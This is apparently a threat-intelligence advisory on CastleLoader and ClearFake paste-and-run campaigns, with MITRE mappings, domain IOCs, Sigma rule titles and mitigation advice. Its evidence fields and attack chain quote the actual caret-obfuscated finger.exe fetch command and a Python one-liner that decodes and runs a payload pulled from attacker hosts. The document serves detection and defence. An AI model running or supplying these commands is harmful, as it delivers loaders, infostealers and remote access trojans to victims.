---
title: CastleLoader Malware Loader and ClearFake Activity in July 2026
slug: 2026-07-castleloader-clearfake
description: Red Canary reports heightened activity of the CastleLoader malware loader, which uses paste-and-run techniques and legitimate tools to deliver infostealers and RATs, alongside continued prevalence of the ClearFake activity cluster in June 2026.
date: "2026-07-23T17:15:44Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - malware
  - loader
  - infostealer
  - remote-access-trojan
  - paste-and-run
  - drive-by download
  - windows
affected_os:
  - Windows
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1566
    technique_name: Phishing
    evidence: CastleLoader has also been distributed through job platform impersonation campaigns targeting LinkedIn and Indeed users. Typosquatted domains like linkedall[.]org, golinked[.]net, and indeed-jobs[.]net used Google Ads for distribution. If navigated to, users encountered fake Cloudflare Turnstile CAPTCHA pages that triggered the paste and run infection chain.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: 'The paste and run initial execution we observed frequently used caret-obfuscated commands with finger.exe, for example: %COMSPEC% /k s^t^a^r^t "" /min for /f "skip=8 delims=" %h in (''f^^i^^n^^g^^e^^r nrLeDHDESi@cheeshomireciple[.]com'') do call %h & exit'
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: This is a Bring-Your-Own-Interpreter (BYOI) technique, in which the adversary bundles a legitimate Python interpreter... The Python interpreter was renamed to a random 12 to 18-digit filename before execution... Another batch command retrieved by finger.exe ran a Base64-encoded, zlib-compressed Python script to retrieve a Python-based shellcode loader.
    confidence_band: high
  - tactic_id: TA0004
    tactic_name: Defense Evasion
    technique_id: T1027
    technique_name: Obfuscated Files or Information
    evidence: The use of carets to attempt to obfuscate the initial execution commands... The shellcode loader used triple-layer encoding (Base64, zlib, UTF-32) and Cyrillic character substitution for obfuscation
    confidence_band: high
  - tactic_id: TA0004
    tactic_name: Defense Evasion
    technique_id: T1027
    technique_name: Obfuscated Files or Information
    evidence: It uses anti-analysis techniques, including cpuid instructions to detect VMware, VirtualBox, and Parallels virtual environments.
    confidence_band: high
  - tactic_id: TA0005
    tactic_name: Defense Evasion
    technique_id: T1218
    technique_name: Signed Binary Proxy Execution
    evidence: The paste and run initial execution we observed frequently used caret-obfuscated commands with finger.exe
    confidence_band: high
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1071
    technique_name: Application Layer Protocol
    evidence: The infected process then reaches out to command and control (C2) servers for additional configuration, tasking, and payloads.
    confidence_band: high
references:
  - https://redcanary.com/blog/threat-intelligence/intelligence-insights-july-2026/
iocs:
  - type: domain
    value: ai-scan[.]digital
  - type: domain
    value: bg-transparency[.]online
  - type: domain
    value: linkedall[.]org
  - type: domain
    value: golinked[.]net
  - type: domain
    value: indeed-jobs[.]net
  - type: domain
    value: captcha-checkpoint[.]top
  - type: domain
    value: mirtona[.]com
ioc_counts:
  domain: 7
rules:
  - title: CastleLoader - Suspicious Finger.exe Execution
    description: Detects suspicious execution of finger.exe with caret-obfuscated commands, a technique used by CastleLoader for initial command retrieval.
    platform: sigma
    severity: high
    tactics:
      - defense_evasion
      - execution
    techniques:
      - T1027.002
      - T1059.003
    data_sources:
      - process_creation
      - windows
  - title: CastleLoader - Python Interpreter Execution from AppData
    description: Detects the execution of Python interpreters from suspicious AppData\Local paths, which CastleLoader uses as a Bring-Your-Own-Interpreter (BYOI) technique.
    platform: sigma
    severity: high
    tactics:
      - defense_evasion
      - execution
    techniques:
      - T1027
      - T1059.006
    data_sources:
      - process_creation
      - windows
  - title: CastleLoader - Outbound C2 Connection from Python
    description: Detects suspicious network connections originating from python.exe to known CastleLoader C2 infrastructure or unusual domains, indicative of payload retrieval or C2 activity.
    platform: sigma
    severity: high
    tactics:
      - command_and_control
    techniques:
      - T1071.001
    data_sources:
      - network_connection
      - windows
rules_count: 3
---

Red Canary's July 2026 Intelligence Insights highlights the continued prevalence of the ClearFake activity cluster and the significant debut of CastleLoader on their top threats list. ClearFake, an activity cluster employing JavaScript injection into compromised websites, delivers malware via drive-by downloads, often utilizing fake CAPTCHA lures to trick users into executing malicious copy-and-paste commands. CastleLoader, also known as CastleBot, is a sophisticated malware loader active since early 2025 that deploys various payloads, including NetSupport Manager, CastleRAT, and .NET-based information stealers. It commonly propagates through paste-and-run campaigns, leveraging social engineering tactics like fake background removal websites and typosquatted job platforms impersonating LinkedIn and Indeed. Attackers use Google Ads for distribution and employ obfuscation techniques, including caret obfuscation in initial commands and multi-layer encoding for its shellcode loader, to evade detection and deliver its final payloads.

## Attack Chain

1. Victim accesses a compromised website (e.g., `ai-scan[.]digital`, `bg-transparency[.]online`) or typosquatted job platform (e.g., `linkedall[.]org`, `golinked[.]net`) distributed via Google Ads.
2. The website presents a fake CAPTCHA verification (e.g., Cloudflare Turnstile), tricking the user into copying malicious commands to their clipboard.
3. The user is lured into pasting and executing the malicious commands in a terminal, typically involving caret-obfuscated commands using `finger.exe`, such as `%COMSPEC% /k s^t^a^r^t "" /min for /f "skip=8 delims=" %h in ('f^^i^^n^^g^^e^^r nrLeDHDESi@cheeshomireciple[.]com') do call %h & exit`.
4. `finger.exe` retrieves additional batch commands from adversary-controlled servers, like `captcha-checkpoint[.]top`.
5. One batch command downloads portable Python distributions (either CPython or IronPython) disguised as PDF files and extracts them using `tar.exe`, placing them in a directory like `C:\users\<usr>\appdata\local\ironpython.3.4.2\net462\`, with the interpreter renamed to a random 12 to 18-digit filename. This is a Bring-Your-Own-Interpreter (BYOI) technique.
6. Another batch command retrieved by `finger.exe` executes a Base64-encoded, zlib-compressed Python script through the newly deployed Python interpreter. This script, observed with a command line like `"C:\Users\<usr>\AppData\Local\python-3.7.7.1-embed-win32\\\\///////\\\\///////\\\\///////python" -c "import sys,subprocess as s,base64 as b,zlib as z;s.Popen([sys.executable,'-c',z.decompress(b.b64decode('eJydk8FKA0EQ...kb8B3z3XZ8=')).decode('utf-32')],creationflags=s.CREATE_NO_WINDOW)"`, retrieves a triple-encoded shellcode loader from resources like `hxxps://mirtona[.]com/4ba0af68-0037-5f6e-afd1-64f89fc0f554/loc12`.
7. The decrypted CastleLoader binary is injected into the `python.exe` process using a shellcode-based loader.
8. The infected `python.exe` process establishes C2 communication for further configuration, tasking, and delivery of final payloads, including NetSupport Manager, CastleRAT, or other information stealers.

## Impact

Successful compromise by CastleLoader leads to the delivery of various payloads, including remote access tools (RATs) like NetSupport Manager and CastleRAT, as well as .NET-based information stealers. This allows adversaries to gain unauthorized remote control over victim endpoints, exfiltrate sensitive data such as credentials, payment card information, keychain details, and cryptocurrency wallets. The use of legitimate remote access tools disguised as malware makes detection challenging, further exacerbating the impact on victim organizations through potential data breaches, financial fraud, and persistent unauthorized access.

## Recommendation

* Deploy the Sigma rules in this brief to your SIEM and tune for your environment, specifically focusing on `CastleLoader - Suspicious Finger.exe Execution` and `CastleLoader - Python Interpreter Execution from AppData` for initial detection.
* Enable process-creation logging (e.g., via Sysmon) to capture command-line arguments and parent-child process relationships, crucial for detecting `finger.exe` and `python.exe` anomalies as described in the attack chain.
* Block the C2 domains listed in the IOC table (`mirtona[.]com`, `captcha-checkpoint[.]top`, `ai-scan[.]digital`, `bg-transparency[.]online`, `linkedall[.]org`, `golinked[.]net`, `indeed-jobs[.]net`) at the DNS resolver and proxy levels.
* Implement strong egress filtering to restrict outbound connections from user workstations, especially from processes like `python.exe`, to prevent C2 communication.
* Educate users about the risks of paste-and-run techniques and suspicious CAPTCHA prompts on unexpected websites to prevent initial infection.
